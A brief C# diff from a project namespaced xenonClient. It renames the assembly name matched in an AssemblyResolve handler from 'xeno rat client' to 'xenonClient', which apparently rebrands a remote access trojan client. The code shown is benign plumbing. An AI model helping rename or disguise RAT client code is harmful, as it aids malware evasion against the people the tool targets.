@@ -54,7 +54,7 @@ namespace xenonClient
         }
         private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
         {
-            if (new AssemblyName(args.Name).Name == "xeno rat client")
+            if (new AssemblyName(args.Name).Name == "xenonClient")
             {
                 return Assembly.GetExecutingAssembly();
             }
